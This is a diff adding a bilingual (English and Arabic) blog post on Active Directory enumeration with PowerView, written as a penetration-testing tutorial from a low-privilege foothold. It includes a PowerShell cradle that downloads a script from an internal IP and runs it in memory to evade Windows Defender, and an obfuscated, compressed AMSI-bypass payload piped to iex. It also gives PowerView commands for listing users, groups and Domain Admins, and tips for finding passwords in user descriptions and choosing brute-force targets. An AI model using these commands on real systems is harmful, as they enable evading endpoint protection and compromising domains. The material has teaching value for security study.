@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Domain Enumeration - PowerView 1 | Jehad Alqurashi</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">active-directory</a><span class="sep">/</span><span>Domain Enumeration - PowerView 1</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">active-directory</span>
+<span class="post-date">2023-08-20</span>
+</div>
+<h1 class="post-title">Domain Enumeration - PowerView 1</h1>
+</header>
+<div class="lang-tabs">
+<button class="lang-tab active" onclick="switchLang('en',this)">English</button>
+<button class="lang-tab" onclick="switchLang('ar',this)">Arabic</button>
+</div>
+<div id="content-en" class="post-content">
+<h2>Introduction</h2>
+<p>In this article, we will explain how to perform information gathering against an Active Directory domain. Before we begin with the enumeration step, let us first take a look at what Active Directory actually is.</p>
+<p>Imagine you have a company with 50 employees, each with their own computer, along with multiple databases. How would you manage all of these massive resources? This is where the Active Directory service comes in.</p>
+<h2>Active Directory Components</h2>
+<p>The key components of Active Directory are:</p>
+<ol>
+<li><strong>Forest, Domain Trees, Domains</strong></li>
+<li><strong>Computers, Users &amp; Groups</strong></li>
+<li><strong>Trusts</strong></li>
+<li><strong>Group Policy</strong></li>
+<li><strong>Access Control Lists (ACLs)</strong></li>
+</ol>
+<p>There are many more components, but these are the most important ones you need to understand. Let me clarify some of these in more detail.</p>
+<h3>Domains, Domain Trees, and Forests</h3>
+<p>A Forest contains Domain Trees, and each Domain Tree contains Domains. They form a hierarchical structure where the Forest is the top-level container.</p>
+
+<figure class="article-img"><img src="../assets/images/domain-enum-one/10.png" alt="Step 1" loading="lazy"></figure>
+<h3>Trusts</h3>
+<p>In an Active Directory environment, a trust is a relationship between two domains or two forests. The purpose of trusts is to allow each domain or forest to access the resources of the other. Trusts are automatically established between domains within the same Domain Tree.</p>
+<p>There are two types of trusts:</p>
+<ol>
+<li>
+<p><strong>One-way Trusts</strong> -- In this type, the first domain can access the resources of the second domain, but the second domain cannot access the resources of the first domain.</p>
+</li>
+<li>
+<p><strong>Two-way Trusts</strong> -- In this type, both domains can access each other's resources.</p>
+</li>
+</ol>
+
+<figure class="article-img"><img src="../assets/images/domain-enum-one/11.png" alt="Step 2" loading="lazy"></figure>
+<h3>Access Control Lists (ACLs)</h3>
+<p>In short, ACLs are lists that define the permissions for each group or each user -- specifying what they are allowed to do on the system.</p>
+<h2>Enumeration with PowerView</h2>
+<p>In this article, we will use the PowerView tool to gather information about the domain we are currently on, operating with limited privileges.</p>
+<p>The purpose of gathering this information is to build a clear map that leads us to the Domain Controller.</p>
+<p><strong>Tool link:</strong></p>
+<ul>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a></li>
+</ul>
+
+<figure class="article-img"><img src="../assets/images/domain-enum-one/12.png" alt="Step 3" loading="lazy"></figure>
+<h3>Loading PowerView into Memory</h3>
+<p>The tool is written in PowerShell, so we will not download the file directly to our machine because Windows Defender would delete it, and we do not have the privileges to disable Windows Defender.</p>
+<p>Instead, we will open PowerShell and execute the following command. The idea behind this command is that it loads the file directly into memory without writing it to disk:</p>
+<pre><code class="language-powershell">iex(New-Object Net.WebClient).DownloadString('http://172.16.99.7:9090/PowerView.ps1')
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/domain-enum-one/2.jpeg" alt="Step 4" loading="lazy"></figure>
+<h3>Bypassing AMSI</h3>
+<p>Before executing that command, something will block us: AMSI. What is AMSI? You can think of it as an antivirus specifically designed to monitor memory -- it checks whether there is malicious code loaded in memory or not.</p>
+<p>We will bypass AMSI using the following encoded and obfuscated PowerShell code:</p>
+<pre><code class="language-powershell">(neW-oBJeCt  iO.COMpRESsiOn.DeflAteSTrEAm([io.MemoryStREAM][coNveRT]::FrOmBAsE64StRINg( 'pZJRT9swEMff/SlOVqQmIqsyOjZENQnKpAkJWEUZe4jy4CaX1ZoTW7YzGqZ9dy5uBoWHvZAH53y+/8/3tx39kO3sED7DKWesc7L9CaveeWzmL2bTm671ssHpRevRarNC+1uW6OaMmW6tZAmlEs7BjvaHMaAv/6LURWO09TH/hbZFNTvkSRHWRpXzwtMPt0RtgeBLb+Er+qXV5VlVWXQuHrObK111ClPS2KExQyXXosFk/rbdLrWoLuXaCtvHI7p9C3attYI7aX0nFNnwWPp/FpQZPaXwfUxV9yv5QKY62Xqo1TXej5oUdOd3aWVq9U1V48LQ2F/GTxkj2Lvb3iBE4dgZi/a80JXmIV2cnOxb5KLhcADcyWmlFE9YNPa0L3h1A/vcFPhZ42RgrErRhmDR1TXaAWYIk7En0KtziJ7854MzKjlKIdt+yChhsS4iQ4il8OVm6GbRe8yLAuJsuzge6o4+DWOWhTHExyE+n5GM7u49qSb5/1/s9EpYtxGKmpsE0fD4J+fa9PFuZwKm8Nzox2TCJG7jHf8AgiRhjw==' ) , [SySteM.io.comPREssioN.CoMPReSSIONMOde]::DEcompreSS)| % { neW-oBJeCt io.sTreAMreaDER( $_ ,[TexT.eNcoDInG]::asCii)}).readtOeNd() |iEX
+</code></pre>
+<p>With that, we have successfully loaded the PowerView file into memory without any issues.</p>
+<h2>Domain Enumeration Commands</h2>
+<p>Now we will start gathering information about the domain -- the domain name, the users present, the computers, the groups, the group members, and so on.</p>
+
+<figure class="article-img"><img src="../assets/images/domain-enum-one/3.png" alt="Step 5" loading="lazy"></figure>
+<h3>Getting the Domain Name and Domain Controller</h3>
+<p>We can identify the domain name and the Domain Controller by running this command:</p>
+<pre><code class="language-powershell">Get-NetDomain
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/domain-enum-one/4.png" alt="Step 6" loading="lazy"></figure>
+<h3>Enumerating Users</h3>
+<p>This command lists all users on the domain:</p>
+<pre><code class="language-powershell">Get-NetUser
+</code></pre>
+<p>To extract information about a specific user:</p>
+<pre><code class="language-powershell">Get-NetUser -Username ciadmin
+</code></pre>
+<p>We can see that we extracted the information for the user named <code>ciadmin</code>. But what can we actually gain from this?</p>
+<p>There are several useful fields. For example, <code>logoncount</code> -- we notice its value is 137, which means this person has logged into their account 137 times. This tells us the account is likely not dormant, meaning we could attempt a Brute Force attack against it.</p>
+<p>Another useful field is <code>pwdlastset</code>, which tells us when the user last changed their password. If it was a long time ago, it is possible the password is easy to guess.</p>
+<h3>Searching User Descriptions for Credentials</h3>
+<p>This command searches for a specific keyword in the description field of all users:</p>
+<pre><code class="language-powershell">Find-UserField -SearchField Description -SearchTerm &quot;built&quot;
+</code></pre>
+<p>Some users may put their password in their account description, thinking nobody can read it. You can replace the word "built" with "password" to search for credentials hidden in user descriptions.</p>
+
+<figure class="article-img"><img src="../assets/images/domain-enum-one/5.png" alt="Step 7" loading="lazy"></figure>
+<h3>Enumerating Domain Computers</h3>
+<p>This command displays all computers joined to the domain:</p>
+<pre><code class="language-powershell">Get-NetComputer
+</code></pre>
+<p>You can add an option to the previous command to extract more detailed information about the domain-joined computers:</p>
+<pre><code class="language-powershell">Get-NetComputer -FullData
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/domain-enum-one/6.png" alt="Step 8" loading="lazy"></figure>
+<h3>Enumerating Domain Groups</h3>
+<p>This command lists all groups associated with the domain:</p>
+<pre><code class="language-powershell">Get-NetGroup
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/domain-enum-one/7.png" alt="Step 9" loading="lazy"></figure>
+<h3>Listing Members of a Specific Group</h3>
+<p>This command lists the members of a specific group:</p>
+<pre><code class="language-powershell">Get-NetGroupMember -GroupName &quot;Domain Admins&quot;
+</code></pre>
+<p>We can see that the users <code>svcadmin</code> and <code>Administrator</code> are members of the Domain Admins group.</p>
+
+<figure class="article-img"><img src="../assets/images/domain-enum-one/8.png" alt="Step 10" loading="lazy"></figure>
+<h3>Finding Group Membership for a User</h3>
+<p>This command shows which groups a specific user belongs to:</p>
+<pre><code class="language-powershell">Get-NetGroup -UserName &quot;svcadmin&quot;
+</code></pre>
+<h2>Conclusion</h2>
+<p>By following these enumeration steps, we can build a comprehensive map of the Active Directory environment -- identifying domain controllers, users, computers, groups, and trust relationships -- all from a low-privilege foothold. This information is critical for planning the next stages of an attack and finding a path to the Domain Controller.</p>
+<figure class="article-img"><img src="../assets/images/domain-enum-one/9.png" alt="Step 11" loading="lazy"></figure>
+
+</div>
+<div id="content-ar" class="post-content rtl-content" style="display:none;direction:rtl;text-align:right;">
+<p>السلام عليكم ورحمة الله وبركاته</p>
+<p>الحمد لله على جميع نِعمه علينا ما علمنا منها وما لم نعلم حمداً والصلاة والسلام على نبينا محمد اشرف الخلق والمرسلين, اما بعد:</p>
+<p>مقدمة:</p>
+<p>في هذي المقالة راح نشرح كيفية جمع المعلومات بالنسبة للدومين</p>
+<p>بس قبل لا نبدا بخطوة جمع المعلومات خلونا ناخذ نظره عن ايش هو ال Active Directory</p>
+<p>نفترض لو عندنا شركة تتكون من 50 موظف وكل موظف له جهاز خاص فيه وعندنا قواعد بيانات متعددة كيف نحن راح نسوي ادارة لكل هذي المصادر الهائلة</p>
+<p>في هذي النقطة راح نستفيد من خدمة ال Active Directory</p>
+<p>ايش هي مكونات ال Active Directory :</p>
+<p>1- Forest ,Domain Trees ,Domains</p>
+<p>2- Computers Users & Groups</p>
+<p>3- Trusts</p>
+<p>4- Group Policy</p>
+<p>5- Access Control List</p>
+<p>طبعا المكونات كثيره لكن هذي اهمها او اللي لازم تتعرف عليها</p>
+<p>طبعا بعض المكونات مو واضح فكرتها ف راح اوضحها</p>
+<p>1- Domains,Domains Trees,Forest</p>
+<p>طبعا في الصورة اللي مرفقه نلاحظ انه ال Forest يحتوي على Domains Tree و ال Domain Tree يحتوي على Domains</p>
+<p>3- Trusts</p>
+<p>في بيئة ال Active Directory الوثوقية تعني علاقة بين نطاقين او بين غابتين (Forests)</p>
+<p>فايدة الوثوقية ان كل من النطاقين او الغابتين تسمح بالوصول الى موارد النطاق الاخر او الغابة الاخرى</p>
+<figure class="article-img"><img src="../assets/images/domain-enum-one/10.png" alt="Step 1" loading="lazy"></figure>
+
+<p>الوثوقية تكون تلقائية اذا كانوا بنفس Domain Tree</p>
+<p>انواع الوثوقية:</p>
+<p>1- One-way Trusts</p>
+<p>2- Tow-way Trusts</p>
+<p>طيب ايش الفرق بين هذي الانواع؟</p>
+<figure class="article-img"><img src="../assets/images/domain-enum-one/11.png" alt="Step 2" loading="lazy"></figure>
+
+<p>1- One-way Trusts</p>
+<p>في هذا النوع يمكن النطاق الاول الوصول الى موارد النطاق الثاني بينما النطاق الثاني لايمكنه الوصول الى موارد النطاق الاول</p>
+<p>2- Tow-way Trusts</p>
+<p>في هذا النوع يمكن للنطاقين الوصول الى موارد الاخر</p>
+<figure class="article-img"><img src="../assets/images/domain-enum-one/12.png" alt="Step 3" loading="lazy"></figure>
+
+<p>5- Access Control List</p>
+<p>طبعا فكرة ACLs ب اختصار انها قائمة تحدد فيها الصلاحيات لكل قروب او كل مستخدم ايش يقدر يسوي</p>
+<p>الشرح:</p>
+<p>في هذي المقالة راح نستخدم اداة PowerView عشان نجمع معلومات عن ال Domain اللي نحن موجودين عليه بصلاحية محدودة</p>
+<p>الفايدة من جمع المعلومات عشان نرسم خريطة واضحه توصلنا الى Domain Controller</p>
+<figure class="article-img"><img src="../assets/images/domain-enum-one/2.jpeg" alt="Step 4" loading="lazy"></figure>
+
+<p>رابط الاداة</p>
+<p>PowerView</p>
+<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</p>
+<p>طبعا الاداة مكتوبة بلغة PowerShell ف ماراح اسوي تنزيل للملف حقها على جهازي لان راح يحذفها ال Windows Defender وانا ماعندي صلاحية حتى اسوي Disable لي ال Windows Defender</p>
+<p>ف راح افتح ال PowerShell وانفذ هذا الامر فكرة الامر هذا انه يسوي Load للملف في الميموري دايركت</p>
+<figure class="article-img"><img src="../assets/images/domain-enum-one/3.png" alt="Step 5" loading="lazy"></figure>
+
+<p>iex(New-Object Net.WebClient).DownloadString('http://172.16.99.7:9090/PowerView.ps1')</p>
+<p>بس قبل انفذ هذا الامر راح يوقفنا شي اللي هو ال AMSI ايش هو ال AMSI</p>
+<p>تقدر تقول انه Anti Virus خاص في تعقب الميموري هل يوجد في الميموري كود خبيث او لا</p>
+<p>ف راح نتخطاه عن طريق هذا الكود</p>
+<p>(neW-oBJeCt  iO.COMpRESsiOn.DeflAteSTrEAm([io.MemoryStREAM][coNveRT]::FrOmBAsE64StRINg( 'pZJRT9swEMff/SlOVqQmIqsyOjZENQnKpAkJWEUZe4jy4CaX1ZoTW7YzGqZ9dy5uBoWHvZAH53y+/8/3tx39kO3sED7DKWesc7L9CaveeWzmL2bTm671ssHpRevRarNC+1uW6OaMmW6tZAmlEs7BjvaHMaAv/6LURWO09TH/hbZFNTvkSRHWRpXzwtMPt0RtgeBLb+Er+qXV5VlVWXQuHrObK111ClPS2KExQyXXosFk/rbdLrWoLuXaCtvHI7p9C3attYI7aX0nFNnwWPp/FpQZPaXwfUxV9yv5QKY62Xqo1TXej5oUdOd3aWVq9U1V48LQ2F/GTxkj2Lvb3iBE4dgZi/a80JXmIV2cnOxb5KLhcADcyWmlFE9YNPa0L3h1A/vcFPhZ42RgrErRhmDR1TXaAWYIk7En0KtziJ7854MzKjlKIdt+yChhsS4iQ4il8OVm6GbRe8yLAuJsuzge6o4+DWOWhTHExyE+n5GM7u49qSb5/1/s9EpYtxGKmpsE0fD4J+fa9PFuZwKm8Nzox2TCJG7jHf8AgiRhjw==' ) , [SySteM.io.comPREssioN.CoMPReSSIONMOde]::DEcompreSS)| % { neW-oBJeCt io.sTreAMreaDER( $_ ,[TexT.eNcoDInG]::asCii)}).readtOeNd() |iEX</p>
+<figure class="article-img"><img src="../assets/images/domain-enum-one/4.png" alt="Step 6" loading="lazy"></figure>
+
+<p>بكذا سوينا Load للملف في الميموري بدون مشاكل</p>
+<p>الان راح نبدا نجمع معلومات عن الدومين اسم الدومين ومنهم المستخدمين الموجودين وايش الكمبيوترات وايش القروبات الموجودة ومنهم اعضاء القروبات الخ</p>
+<p>راح نعرف اسم الدومين و ال Domain Controller عن طريق هذا الامر</p>
+<p>Get-NetDomain</p>
+<p>عن طريق هذا الامر راح نعرف منهم المستخدمين الموجودين على النظام</p>
+<figure class="article-img"><img src="../assets/images/domain-enum-one/5.png" alt="Step 7" loading="lazy"></figure>
+
+<p>Get-NetUser</p>
+<p>هذا الامر لي استخراج معلومات مستخدم محدد</p>
+<p>Get-NetUser –Username ciadmin</p>
+<p>نلاحظ انه استخرجنا معلومات للمستخدم اللي اسمه ciadmin طيب ايش راح نستفيد؟</p>
+<p>في اشياء راح تفيدنا مثلا logoncount نلاحظ انه قيمتها 137 هذا يعني انه هذا الشخص دخل على حسابه 137 مره هذا يعني انه ممكن حسابه مو خامل ممكن انه نسوي Brute Force عليه</p>
+<figure class="article-img"><img src="../assets/images/domain-enum-one/6.png" alt="Step 8" loading="lazy"></figure>
+
+<p>او مثلا pwdlastest هذي تعلمنا متى اخر مره غير الباسورد حقه ف اذا كان من فترة طويلة ف من الممكن الباسورد حقه يكون سهل تخمينه</p>
+<p>هذا الامر راح يبحث لنا عن كلمة معينة في الوصف الخاص بجميع المستخدمين</p>
+<p>ف بعض المستخدمين من الممكن يحط الباسورد الخاص فيه في الوصف ويعتقد انه مافي احد يقدر يقرأءه ف ممكن نعوض بدل كلمة built ب كلمة password</p>
+<p>Find-UserField -SearchField Description -SearchTerm "built"</p>
+<p>هذا الامر بيعرض لنا جميع الكمبيوترات المرتبطة بالدومين</p>
+<figure class="article-img"><img src="../assets/images/domain-enum-one/7.png" alt="Step 9" loading="lazy"></figure>
+
+<p>Get-NetComputer</p>
+<p>ممكن انه نضيف اوبشن على الامر السابق بحيث يستخرج لنا معلومات اكثر عن الكمبيوترات المرتبطة بالدومين</p>
+<p>Get-NetComputer -FullData</p>
+<p>هذا الامر يعرض لنا القروبات الموجودة المرتبطة بالدومين</p>
+<figure class="article-img"><img src="../assets/images/domain-enum-one/8.png" alt="Step 10" loading="lazy"></figure>
+
+<p>Get-NetGroup</p>
+<p>هذا الامر يستعرض لنا اعضاء قروب محدد</p>
+<p>Get-NetGroupMember -GroupName "Domain Admins"</p>
+<p>نلاحظ انه المستخدم اللي اسمه svcadmin و Administrator ضمن قروب Domain Admins</p>
+<p>هذا الامر يستخرج لنا المستخدم متواجد في اي قروب</p>
+<figure class="article-img"><img src="../assets/images/domain-enum-one/9.png" alt="Step 11" loading="lazy"></figure>
+
+<p>Get-NetGroup –UserName "svcadmin"</p>
+<p>الى هنا وصلنا الى نهاية المقالة</p>
+<p>اتمنى انها نالت على اعجابكم</p>
+<p>شاكر لكم.</p>
+</div>
+<div class="post-nav">
+<a href="../index.html">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2024 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+function switchLang(lang, btn) {
+  document.querySelectorAll('.lang-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('content-en').style.display = lang === 'en' ? '' : 'none';
+  document.getElementById('content-ar').style.display = lang === 'ar' ? '' : 'none';
+}
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
